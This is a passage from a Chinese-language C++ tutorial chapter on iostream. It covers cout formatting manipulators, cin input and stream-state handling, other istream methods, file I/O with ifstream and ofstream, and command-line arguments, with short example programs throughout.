的基类）提供了一些成员函数来设置格式标志。 操纵符 (Manipulators): 定义在 &lt;iostream&gt; 和 &lt;iomanip&gt; 中的特殊函数，可以像插入值一样插入到 cout 语句中来改变流的状态。使用操纵符通常更方便。 1. 修改数值的基数 (dec, hex, oct)可以使用操纵符 dec, hex, oct 来改变整数输出的基数（默认为十进制 dec）。这些设置是粘性 (sticky) 的，即一旦设置，后续所有整数输出都会采用该基数，直到被重新设置为止。 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int num = 255; std::cout &lt;&lt; &quot;Default (decimal): &quot; &lt;&lt; num &lt;&lt; std::endl; // 输出 255 std::cout &lt;&lt; std::hex; // 设置为十六进制 std::cout &lt;&lt; &quot;Hexadecimal: &quot; &lt;&lt; num &lt;&lt; std::endl; // 输出 ff std::cout &lt;&lt; std::oct; // 设置为八进制 std::cout &lt;&lt; &quot;Octal: &quot; &lt;&lt; num &lt;&lt; std::endl; // 输出 377 std::cout &lt;&lt; std::dec; // 恢复为十进制 std::cout &lt;&lt; &quot;Decimal again: &quot; &lt;&lt; num &lt;&lt; std::endl; // 输出 255 // 配合 showbase 和 uppercase std::cout &lt;&lt; std::showbase &lt;&lt; std::uppercase; // 显示基数前缀并使用大写字母 std::cout &lt;&lt; &quot;Hex with base and uppercase: &quot; &lt;&lt; std::hex &lt;&lt; num &lt;&lt; std::endl; // 输出 0XFF std::cout &lt;&lt; &quot;Octal with base: &quot; &lt;&lt; std::oct &lt;&lt; num &lt;&lt; std::endl; // 输出 0377 std::cout &lt;&lt; std::noshowbase &lt;&lt; std::nouppercase &lt;&lt; std::dec; // 恢复默认 return 0;&#125; showbase: 显示数值基数的前缀（0x 或 0X 表示十六进制，0 表示八进制）。 noshowbase: 不显示基数前缀（默认）。 uppercase: 十六进制输出时使用大写字母 A-F 和 X。 nouppercase: 使用小写字母（默认）。 2. 调整字段宽度 (width(), setw())可以指定输出下一个值时使用的最小字段宽度。如果值的实际宽度小于指定宽度，则用填充字符（默认为空格）填充。 cout.width(int w) (成员函数): 设置下一次输出的最小宽度为 w。只对紧随其后的下一次输出有效，之后会自动恢复默认（宽度为 0）。 setw(int w) (操纵符, &lt;iomanip&gt;): 与 width() 效果相同，也是只对下一次输出有效。使用 setw 通常更方便。 123456789101112131415161718#include &lt;iostream&gt;#include &lt;iomanip&gt; // for setwint main() &#123; double val = 12.3; std::cout &lt;&lt; &quot;*&quot; &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 *12.3* std::cout.width(10); // 设置宽度为 10 std::cout &lt;&lt; &quot;*&quot; &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 * 12.3* (右对齐) // 宽度设置失效 std::cout &lt;&lt; &quot;*&quot; &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 *12.3* // 使用 setw std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(5) &lt;&lt; &quot;Hi&quot; &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 * 12.3* Hi* return 0;&#125; 3. 填充字符 (fill())当字段宽度大于值的实际宽度时，用于填充空白区域的字符可以通过 fill() 成员函数或 setfill() 操纵符设置。这个设置是粘性的。 cout.fill(char ch) (成员函数): 设置填充字符为 ch。返回之前的填充字符。 setfill(char ch) (操纵符, &lt;iomanip&gt;): 设置填充字符为 ch。 12345678910111213141516#include &lt;iostream&gt;#include &lt;iomanip&gt; // for setw, setfillint main() &#123; int num = 42; std::cout &lt;&lt; &quot;Default fill: *&quot; &lt;&lt; std::setw(6) &lt;&lt; num &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 * 42* std::cout.fill(&#x27;*&#x27;); // 设置填充字符为 &#x27;*&#x27; std::cout &lt;&lt; &quot;Star fill: *&quot; &lt;&lt; std::setw(6) &lt;&lt; num &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 ****42* // 使用 setfill std::cout &lt;&lt; &quot;Dash fill: *&quot; &lt;&lt; std::setfill(&#x27;-&#x27;) &lt;&lt; std::setw(6) &lt;&lt; num &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 ----42* std::cout.fill(&#x27; &#x27;); // 恢复默认填充字符 return 0;&#125; 4. 浮点数精度 (precision(), setprecision())可以控制浮点数输出的小数位数或总有效数字位数，具体取决于浮点数格式（见下文）。 cout.precision(int p) (成员函数): 设置精度为 p。返回之前的精度值。默认精度通常是 6。这个设置是粘性的。 setprecision(int p) (操纵符, &lt;iomanip&gt;): 设置精度为 p。 1234567891011121314151617#include &lt;iostream&gt;#include &lt;iomanip&gt; // for setprecision#include &lt;cmath&gt; // for M_PIint main() &#123; double pi = M_PI; // 大约 3.14159265... std::cout &lt;&lt; &quot;Default precision: &quot; &lt;&lt; pi &lt;&lt; std::endl; // 通常输出 6 位有效数字 std::cout.precision(4); // 设置精度为 4 std::cout &lt;&lt; &quot;Precision 4: &quot; &lt;&lt; pi &lt;&lt; std::endl; // 输出 3.142 (默认模式下是有效数字) // 使用 setprecision std::cout &lt;&lt; &quot;Precision 8: &quot; &lt;&lt; std::setprecision(8) &lt;&lt; pi &lt;&lt; std::endl; // 输出 3.1415927 std::cout.precision(6); // 恢复默认精度 return 0;&#125; 5. 浮点数格式 (setf(), unsetf(), fixed, scientific)可以控制浮点数是以定点表示法 (fixed) 还是科学计数法 (scientific) 显示。 fixed (操纵符): 使用定点表示法。此时，precision() 控制的是小数点后的位数。 scientific (操纵符): 使用科学计数法（例如 1.23e+04）。此时，precision() 控制的是小数点后的位数。 默认格式: 如果既未设置 fixed 也未设置 scientific，则 cout 会自动选择一种格式（定点或科学计数法），以产生更紧凑的表示。此时，precision() 控制的是总的有效数字位数（整数部分+小数部分）。 ios_base::floatfield: fixed 和 scientific 都是格式标志位。可以使用 cout.setf(ios_base::fixed, ios_base::floatfield) 和 cout.setf(ios_base::scientific, ios_base::floatfield) 来设置，使用 cout.unsetf(ios_base::floatfield) 来清除设置恢复默认行为。使用操纵符通常更简单。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;iomanip&gt; // for fixed, scientific, setprecisionint main() &#123; double num1 = 12345.6789; double num2 = 0.000012345; std::cout &lt;&lt; std::setprecision(5); // 设置精度为 5 std::cout &lt;&lt; &quot;Default format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // 输出 12346 1.2345e-05 (精度5表示有效数字) std::cout &lt;&lt; std::fixed; // 设置为定点格式 std::cout &lt;&lt; &quot;Fixed format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // 输出 12345.67890 0.00001 (精度5表示小数位数) std::cout &lt;&lt; std::scientific; // 设置为科学计数法格式 std::cout &lt;&lt; &quot;Scientific format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // 输出 1.23457e+04 1.23450e-05 (精度5表示小数位数) // 恢复默认格式 (需要清除 floatfield) std::cout.unsetf(std::ios_base::floatfield); std::cout &lt;&lt; &quot;Back to default format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // 输出 12346 1.2345e-05 return 0;&#125; 6. 其他格式标志和操纵符 对齐方式 (left, right, internal): left: 在字段内左对齐输出，填充字符放在右边。 right: 在字段内右对齐输出，填充字符放在左边（默认）。 internal: 符号（正负号或基数前缀）左对齐，数值右对齐，填充字符放在中间。 可以通过 setf() 设置 ios_base::left, ios_base::right, ios_base::internal 标志，或使用同名操纵符。 1234std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; std::left &lt;&lt; &quot;Hi&quot; &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 *Hi *std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; std::right &lt;&lt; -12 &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 * -12*std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; std::internal &lt;&lt; -12 &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // 输出 *- 12*std::cout &lt;&lt; std::right; // 恢复默认右对齐 显示小数点 (showpoint, noshowpoint): showpoint: 强制显示浮点数的小数点和末尾的零（即使小数部分为零）。 noshowpoint: 不强制显示（默认）。 12345std::cout &lt;&lt; std::fixed &lt;&lt; std::setprecision(2);std::cout &lt;&lt; &quot;Default: &quot; &lt;&lt; 12.0 &lt;&lt; std::endl; // 可能输出 12 (取决于实现)std::cout &lt;&lt; std::showpoint;std::cout &lt;&lt; &quot;Showpoint: &quot; &lt;&lt; 12.0 &lt;&lt; std::endl; // 输出 12.00std::cout &lt;&lt; std::noshowpoint; 显示正号 (showpos, noshowpos): showpos: 对于非负数，在前面显示 + 号。 noshowpos: 不显示正号（默认）。 1234std::cout &lt;&lt; +10 &lt;&lt; &quot; &quot; &lt;&lt; -10 &lt;&lt; std::endl; // 输出 10 -10std::cout &lt;&lt; std::showpos;std::cout &lt;&lt; +10 &lt;&lt; &quot; &quot; &lt;&lt; -10 &lt;&lt; std::endl; // 输出 +10 -10std::cout &lt;&lt; std::noshowpos; 布尔值格式 (boolalpha, noboolalpha): boolalpha: 将 bool 值输出为字符串 “true” 或 “false”。 noboolalpha: 将 bool 值输出为整数 1 或 0（默认）。 12345bool flag = true;std::cout &lt;&lt; &quot;Default bool: &quot; &lt;&lt; flag &lt;&lt; std::endl; // 输出 1std::cout &lt;&lt; std::boolalpha;std::cout &lt;&lt; &quot;Boolalpha: &quot; &lt;&lt; flag &lt;&lt; std::endl; // 输出 truestd::cout &lt;&lt; std::noboolalpha; 7. 设置格式 (setf())setf() 是一个更底层的设置格式标志的方法。它有两个版本： fmtflags setf(fmtflags flags): 设置 flags 中指定的位。例如 cout.setf(ios_base::showpos)。 fmtflags setf(fmtflags flags, fmtflags mask): 先清除 mask 中指定的位，然后设置 flags 中指定的位。这用于设置互斥的标志组，如对齐方式 (adjustfield) 或浮点数格式 (floatfield)。例如 cout.setf(ios_base::left, ios_base::adjustfield)。 虽然 setf() 提供了完全的控制，但使用操纵符通常更易读、更方便。 保存和恢复格式状态: 有时你可能想临时改变格式，之后再恢复。可以保存 flags() 和 precision() 的值，之后再用 flags(old_flags) 和 precision(old_precision) 恢复。 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;iomanip&gt;int main() &#123; // 保存当前格式状态 std::ios_base::fmtflags original_flags = std::cout.flags(); std::streamsize original_precision = std::cout.precision(); // 进行一些格式化输出 std::cout &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; std::showpos; std::cout &lt;&lt; &quot;Formatted: &quot; &lt;&lt; 12.345 &lt;&lt; &quot; &quot; &lt;&lt; -6.7 &lt;&lt; std::endl; // 恢复原始格式状态 std::cout.flags(original_flags); std::cout.precision(original_precision); std::cout &lt;&lt; &quot;Restored: &quot; &lt;&lt; 12.345 &lt;&lt; &quot; &quot; &lt;&lt; -6.7 &lt;&lt; std::endl; return 0;&#125; 通过组合使用这些格式化工具，可以精确地控制 cout 输出数据的外观。 17.3 使用 cin 进行输入std::cin 是 C++ 标准库 &lt;iostream&gt; 中预定义的一个 istream 类的全局对象，通常连接到标准输入设备（如键盘）。它是 C++ 中获取用户输入的主要方式。 cin 最常见的用法是配合提取运算符 (&gt;&gt;) 使用。这个运算符也被重载以接受各种基本数据类型（int, float, double, char 等）以及 std::string 和 C 风格字符数组。 cin &gt;&gt; 的工作方式: 跳过空白: &gt;&gt; 运算符默认会跳过输入流中所有前导的空白字符（空格、制表符、换行符）。 读取和转换: 它会根据目标变量的类型，从缓冲区读取非空白字符，并尝试将这些字符转换为目标类型的值。 停止读取: 读取会在遇到不适合目标类型的字符（例如，读取 int 时遇到字母）或下一个空白字符时停止。 存储值: 成功转换的值被存储在目标变量中。 留下分隔符: 导致读取停止的那个不合适的字符或空白字符会留在输入缓冲区中，等待下一次读取。 示例: 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int age; double price; std::string name; char initial; std::cout &lt;&lt; &quot;Enter age, price, initial, and name (separated by spaces): &quot;; // Example input: 30 99.99 J Doe std::cin &gt;&gt; age &gt;&gt; price &gt;&gt; initial &gt;&gt; name; // 可以链接读取 std::cout &lt;&lt; &quot;\\n--- You entered ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; // Output: 30 std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; // Output: 99.99 std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; // Output: J std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; // Output: Doe (只读取到空格前) // 此时，输入缓冲区中可能还留有 &quot; Doe&quot; 后面的换行符 return 0;&#125; 17.3.1 cin &gt;&gt; 如何检查输入cin &gt;&gt; 表达式本身会返回 cin 对象 (istream&amp;)。C++ 允许在需要布尔值的地方（如 if 或 while 条件）使用流对象。当流对象被用作条件时，它会检查流的**状态 (state)**。如果流处于“良好”状态（没有发生错误），条件为 true；如果流发生错误（如读取失败、到达文件末尾），条件为 false。 这使得可以编写如下循环： 1234567891011121314#include &lt;iostream&gt;int main() &#123; int value; std::cout &lt;&lt; &quot;Enter numbers (non-number to quit): &quot;; // 当 cin &gt;&gt; value 成功读取一个整数时，cin 状态良好，循环继续 // 当输入非数字导致读取失败时，cin 进入 fail 状态，循环终止 while (std::cin &gt;&gt; value) &#123; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Enter next number: &quot;; &#125; std::cout &lt;&lt; &quot;Input terminated or failed.&quot; &lt;&lt; std::endl; return 0;&#125; 17.3.2 流状态istream 类（以及 ostream 和 ios）内部维护一组状态位 (state flags) 来表示流的当前状态。这些状态位定义在 ios_base 类中，类型为 iostate (一种位掩码类型)。 主要的状态位有： goodbit: 表示流处于正常状态，没有发生错误。值为 0。 eofbit: 表示已到达输入流的**末尾 (End Of File)**。当尝试从文件末尾或关闭的输入流读取时设置。 failbit: 表示发生可恢复的格式错误。通常是因为输入的数据格式与期望读取的类型不匹配（例如，期望 int 但输入了字母）。设置 failbit 后，后续的 I/O 操作通常会失败，直到流状态被清除。 badbit: 表示发生不可恢复的严重错误，可能涉及流本身的损坏或底层 I/O 操作失败（例如，读取磁盘时发生硬件错误）。 一个流可能同时设置了多个状态位（例如，在文件末尾尝试读取失败可能同时设置 eofbit 和 failbit）。 检查流状态的成员函数: good(): 如果流状态为 goodbit（即所有错误位都未设置），返回 true。 eof(): 如果设置了 eofbit，返回 true。 fail(): 如果设置了 failbit 或 badbit，返回 true。这是检查读取操作是否失败的最常用方法。 bad(): 如果设置了 badbit，返回 true。 rdstate(): 返回当前所有状态位的组合（一个 iostate 值）。 operator bool(): 重载的布尔转换运算符。如果 fail() 返回 false，则转换为 true；否则转换为 false。这就是为什么可以在 if(cin) 或 while(cin &gt;&gt; value) 中使用流对象的原因。 operator!(): 重载的逻辑非运算符。如果 fail() 返回 true，则 !cin 为 true。 清除流状态: 当流进入 failbit 或 badbit 状态后，后续的 I/O 操作通常会立即失败。为了继续使用该流，必须清除错误状态。 clear(iostate state = goodbit): 重置流的状态位。默认情况下（不带参数或参数为 goodbit），它会清除所有错误位 (eofbit, failbit, badbit)，使流恢复到 good() 状态。也可以用它来设置特定的状态位。 示例：处理输入错误 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;limits&gt; // for numeric_limitsint main() &#123; int number; std::cout &lt;&lt; &quot;Enter an integer: &quot;; while (!(std::cin &gt;&gt; number)) &#123; // 如果读取失败 (cin 返回 false) std::cout &lt;&lt; &quot;Invalid input. Please enter an integer: &quot;; // 1. 清除错误状态 std::cin.clear(); // 2. 丢弃缓冲区中的错误输入 // 读取并忽略直到下一个换行符或缓冲区结束的所有字符 std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); &#125; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number &lt;&lt; std::endl; return 0;&#125; 这个循环会一直要求用户输入，直到成功读取一个整数为止。关键在于读取失败后，必须先 clear() 错误标志，然后 ignore() 掉导致错误的无效输入，否则下一次循环的 cin &gt;&gt; number 还会因为同样的原因失败。 17.3.3 其他 istream 类方法除了 &gt;&gt; 运算符，istream 类还提供了其他用于输入的成员函数，它们提供了更精细的控制。 1. 单字符输入: get()get() 有几个版本用于读取单个字符： int get(): 读取下一个字符（即使是空白字符），并将其作为 int 类型返回。如果到达文件末尾，返回 EOF (一个特殊的负整数常量，定义在 &lt;iostream&gt; 或 &lt;cstdio&gt; 中)。 istream&amp; get(char&amp; ch): 读取下一个字符（即使是空白字符），并将其存储在 ch 中。返回 istream 对象的引用。如果读取失败（如到达文件末尾），会设置 failbit。 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; char ch; std::cout &lt;&lt; &quot;Enter characters (Ctrl+D/Ctrl+Z to end):&quot; &lt;&lt; std::endl; // 使用 get(char&amp;) while (std::cin.get(ch)) &#123; // 读取成功则循环继续 std::cout.put(ch); // 逐个输出读到的字符 &#125; std::cout &lt;&lt; &quot;\\nEnd of input (using get(char&amp;)).\\n&quot;; std::cin.clear(); // 清除 eof 状态以便继续演示 std::cout &lt;&lt; &quot;\\nEnter characters again:&quot; &lt;&lt; std::endl; // 使用 int get() int char_code; while ((char_code = std::cin.get()) != EOF) &#123; std::cout.put(static_cast&lt;char&gt;(char_code)); &#125; std::cout &lt;&lt; &quot;\\nEnd of input (using int get()).\\n&quot;; return 0;&#125; get() 不会跳过空白字符。 2. 字符串输入: get() 和 getline()istream 提供了用于读取 C 风格字符串（字符数组）的 get() 和 getline() 版本。 istream&amp; get(char* s, streamsize n, char delim = &#39;\\n&#39;): 从输入流读取字符，存储到字符数组 s 中。 最多读取 n-1 个字符（为末尾的空字符 \\0 留出空间）。 遇到分隔符 delim 时停止读取。 分隔符 delim 会被留在输入流中，不会被读取到 s 中。 总是在读取的字符序列末尾添加空字符 \\0。 如果因为读取了 n-1 个字符而停止，会设置 failbit。 istream&amp; getline(char* s, streamsize n, char delim = &#39;\\n&#39;): 与 get() 类似，最多读取 n-1 个字符。 遇到分隔符 delim 时停止读取。 分隔符 delim 会从输入流中被读取并丢弃，不会存储在 s 中。 总是在读取的字符序列末尾添加空字符 \\0。 如果因为读取了 n-1 个字符而停止（在遇到分隔符之前），会设置 failbit。 主要区别: getline() 会读取并丢弃分隔符，而 get() 会将分隔符留在流中。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;int main() &#123; char line1[50]; char line2[50]; std::cout &lt;&lt; &quot;Enter line 1: &quot;; std::cin.getline(line1, 50); // 读取整行，丢弃换行符 std::cout &lt;&lt; &quot;Enter line 2: &quot;; std::cin.get(line2, 50); // 读取整行，换行符留在缓冲区 std::cout &lt;&lt; &quot;Line 1: &quot; &lt;&lt; line1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Line 2: &quot; &lt;&lt; line2 &lt;&lt; std::endl; // 检查 get() 之后缓冲区的内容 char next_char; std::cout &lt;&lt; &quot;Character after get(): &quot;; std::cin.get(next_char); // 读取留在缓冲区的换行符 if (next_char == &#x27;\\n&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;\\\\n&#x27;&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; next_char &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 注意: 这些是用于 C 风格字符串的版本。对于 std::string 对象，应使用全局的 getline(cin, str) 函数（如 16.1 节所述）。 17.3.4 其他 istream 方法 read(char* s, streamsize n): 从流中读取精确 n 个字节，并存储到从 s 开始的内存中。它不会在遇到空字符或分隔符时停止，也不会添加空字符。主要用于读取二进制数据。如果读取的字节数少于 n（例如到达文件末尾），会设置 eofbit 和 failbit。 peek(): 返回输入流中的下一个字符的整数值，但不从流中移除该字符。如果到达文件末尾，返回 EOF。可用于在实际读取前查看下一个字符。 gcount(): 返回上一次未格式化读取操作（如 get(), getline(), read()）实际读取的字符数。对于 &gt;&gt; 运算符无效。 putback(char c): 将字符 c 放回输入流中，使其成为下一个被读取的字符。通常只能放回上一个读取的字符。 ignore(streamsize n = 1, int delim = EOF): 读取并丢弃输入流中的字符。 最多丢弃 n 个字符。 如果在此之前遇到并读取了分隔符 delim，则停止丢弃。 分隔符 delim 本身也会被丢弃。 常用于清除缓冲区中的无效输入或跳过不需要的部分。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;limits&gt;int main() &#123; char buffer[10]; std::cout &lt;&lt; &quot;Enter some text (e.g., abcdefghij): &quot;; std::cin.read(buffer, 5); // 读取 5 个字节到 buffer std::cout &lt;&lt; &quot;Read &quot; &lt;&lt; std::cin.gcount() &lt;&lt; &quot; bytes: &quot;; std::cout.write(buffer, std::cin.gcount()) &lt;&lt; std::endl; // 输出读取的内容 char next = std::cin.peek(); // 查看下一个字符 std::cout &lt;&lt; &quot;Next char (peek): &#x27;&quot; &lt;&lt; static_cast&lt;char&gt;(next) &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; char actual_next; std::cin.get(actual_next); // 实际读取下一个字符 std::cout &lt;&lt; &quot;Actual next char (get): &#x27;&quot; &lt;&lt; actual_next &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; std::cin.putback(actual_next); // 将字符放回 std::cin.get(actual_next); // 再次读取 std::cout &lt;&lt; &quot;Read again after putback: &#x27;&quot; &lt;&lt; actual_next &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Ignoring rest of the line...&quot; &lt;&lt; std::endl; std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); // 忽略到行尾 std::cout &lt;&lt; &quot;Enter a final character: &quot;; char final_char; std::cin &gt;&gt; final_char; // 现在可以读取新行的字符了 std::cout &lt;&lt; &quot;Final char: &quot; &lt;&lt; final_char &lt;&lt; std::endl; return 0;&#125; 通过组合使用 cin &gt;&gt; 和这些 istream 成员函数，可以实现灵活多样的输入处理逻辑，并能有效地处理输入错误。 17.4 文件输入和输出除了与控制台进行交互（cin, cout），程序经常需要从文件中读取数据或将数据写入文件。C++ 的 iostream 库通过 &lt;fstream&gt; 头文件提供了用于文件 I/O 的类。 &lt;fstream&gt; 定义了三个主要的类： ifstream (input file stream): 继承自 istream，专门用于从文件读取数据。 ofstream (output file stream): 继承自 ostream，专门用于向文件写入数据。 fstream: 继承自 iostream，可以同时支持文件的读取和写入。 这些文件流类的使用方式与 cin 和 cout 非常相似，因为它们继承了相同的基类并支持相同的操作符（如 &lt;&lt;, &gt;&gt;) 和方法（如 get(), getline(), write(), read()）。 17.4.1 简单的文件 I/O进行文件 I/O 的基本步骤： 包含头文件: #include &lt;fstream&gt;。 创建流对象: 创建一个 ifstream (用于读取) 或 ofstream (用于写入) 或 fstream (用于读写) 对象。 关联文件: 将流对象与一个具体的文件关联起来。这可以在创建对象时通过构造函数完成，也可以之后使用 open() 方法。 检查是否成功打开: 使用 is_open() 方法或检查流对象的状态来确认文件是否成功打开。 进行 I/O 操作: 使用 &lt;&lt;, &gt;&gt;, get(), getline(), write(), read() 等方法读写文件，就像使用 cin 和 cout 一样。 关闭文件: 使用 close() 方法关闭文件，断开流对象与文件的关联。重要: 当文件流对象离开作用域时（例如函数结束），其析构函数会自动调用 close()，因此显式调用 close() 通常不是必需的，但有时为了明确或检查关闭状态可以这样做。 示例：写入文件 12345678910111213141516171819202122232425262728293031#include &lt;fstream&gt; // 包含 fstream 头文件#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // 1. 创建 ofstream 对象并通过构造函数关联文件 // 默认以输出模式 (ios_base::out) 打开，如果文件存在则清空内容 std::ofstream outFile(&quot;mydata.txt&quot;); // 2. 检查文件是否成功打开 if (!outFile.is_open()) &#123; // 或者 if (!outFile) std::cerr &lt;&lt; &quot;Error opening file for writing!&quot; &lt;&lt; std::endl; return 1; &#125; // 3. 向文件写入数据 (类似 cout) std::string name = &quot;Alice&quot;; int age = 25; double score = 95.5; outFile &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; outFile &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; outFile &lt;&lt; &quot;Score: &quot; &lt;&lt; score &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Data written to mydata.txt&quot; &lt;&lt; std::endl; // 4. 关闭文件 (可选，析构函数会自动调用) // outFile.close(); return 0; // outFile 在这里离开作用域，析构函数调用 close()&#125; 示例：读取文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // 1. 创建 ifstream 对象并关联文件 // 默认以输入模式 (ios_base::in) 打开 std::ifstream inFile(&quot;mydata.txt&quot;); // 2. 检查文件是否成功打开 if (!inFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening file for reading!&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;Reading data from mydata.txt:&quot; &lt;&lt; std::endl; // 3. 从文件读取数据 (类似 cin) std::string line; // 逐行读取 while (getline(inFile, line)) &#123; // 使用全局 getline 读取整行到 string std::cout &lt;&lt; line &lt;&lt; std::endl; &#125; // 或者，如果知道格式，可以像 cin 一样读取 /* std::string label1, name, label2, label3; int age; double score; inFile &gt;&gt; label1 &gt;&gt; name &gt;&gt; label2 &gt;&gt; age &gt;&gt; label3 &gt;&gt; score; if (inFile) &#123; // 检查读取是否成功 std::cout &lt;&lt; &quot;Read Name: &quot; &lt;&lt; name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Read Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Read Score: &quot; &lt;&lt; score &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Error reading data format.&quot; &lt;&lt; std::endl; &#125; */ // 4. 关闭文件 (可选) // inFile.close(); return 0;&#125; 17.4.2 流状态检查和 is_open() is_open(): 文件流对象提供 is_open() 成员函数，用于检查文件是否成功打开并与流关联。在尝试进行任何 I/O 操作之前，务必调用此函数进行检查。 流状态位: 文件流对象也具有与 cin 相同的状态位 (goodbit, eofbit, failbit, badbit)。 如果 open() 失败，流对象的状态通常会设置为 failbit。因此，if (!outFile) 或 if (!inFile) 也可以用来检查文件是否成功打开。 在读取过程中，如果遇到文件末尾，会设置 eofbit。 如果读取的数据格式不匹配（例如，试图将文本读入 int），会设置 failbit。 如果发生底层 I/O 错误，会设置 badbit。 可以使用 good(), eof(), fail(), bad() 来检查这些状态，并使用 clear() 来清除错误状态（如果可恢复）。 17.4.3 打开多个文件一个程序可以同时打开多个文件，只需为每个文件创建一个对应的文件流对象即可。 12345678910111213141516171819202122232425262728#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::ifstream sourceFile(&quot;input.txt&quot;); std::ofstream destFile(&quot;output.txt&quot;); if (!sourceFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening input.txt&quot; &lt;&lt; std::endl; return 1; &#125; if (!destFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening output.txt&quot; &lt;&lt; std::endl; return 1; // sourceFile 会自动关闭 &#125; std::string line; while (getline(sourceFile, line)) &#123; // 处理 line ... destFile &lt;&lt; &quot;Copied: &quot; &lt;&lt; line &lt;&lt; std::endl; // 写入到目标文件 &#125; std::cout &lt;&lt; &quot;File copy finished.&quot; &lt;&lt; std::endl; // sourceFile 和 destFile 会在 main 结束时自动关闭 return 0;&#125; 17.4.4 命令行处理技术通常，我们希望在运行程序时通过命令行参数来指定要处理的文件名，而不是将文件名硬编码在程序中。main 函数可以接收命令行参数： 123int main(int argc, char *argv[]) &#123; // ...&#125; argc (argument count): 一个整数，表示传递给程序的命令行参数的数量（包括程序本身的名称）。 argv (argument vector): 一个指向 C 风格字符串（char*）的指针数组。 argv[0] 通常是程序本身的名称。 argv[1] 是第一个命令行参数。 argv[2] 是第二个命令行参数，依此类推。 argv[argc] 是一个空指针 (nullptr)。 示例：使用命令行参数指定输入和输出文件 1234567891011121314151617181920212223242526272829303132333435#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt; // 用于存储参数int main(int argc, char *argv[]) &#123; // 检查参数数量是否正确 if (argc != 3) &#123; // 需要程序名 + 输入文件名 + 输出文件名 std::cerr &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;input_file&gt; &lt;output_file&gt;&quot; &lt;&lt; std::endl; return 1; &#125; // argv[1] 是输入文件名, argv[2] 是输出文件名 std::ifstream sourceFile(argv[1]); std::ofstream destFile(argv[2]); if (!sourceFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening input file: &quot; &lt;&lt; argv[1] &lt;&lt; std::endl; return 1; &#125; if (!destFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Error opening output file: &quot; &lt;&lt; argv[2] &lt;&lt; std::endl; return 1; &#125; // ... (文件处理逻辑，例如复制) ... char ch; while (sourceFile.get(ch)) &#123; destFile.put(ch); &#125; 